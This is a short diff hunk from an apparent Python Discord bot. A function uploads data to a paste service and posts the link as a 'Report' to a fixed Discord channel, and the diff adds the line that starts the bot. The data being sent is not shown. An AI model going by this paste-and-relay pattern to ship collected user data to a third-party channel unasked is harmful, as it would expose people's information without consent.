@@ -58,3 +58,5 @@ def pasteAndSend(data):
     pasteLink = pasteLink['link']
     channel = bot.get_channel(667025203523616773)
     channel.send(f'Report: {pasteLink}')
+
+bot.run(discordKey)
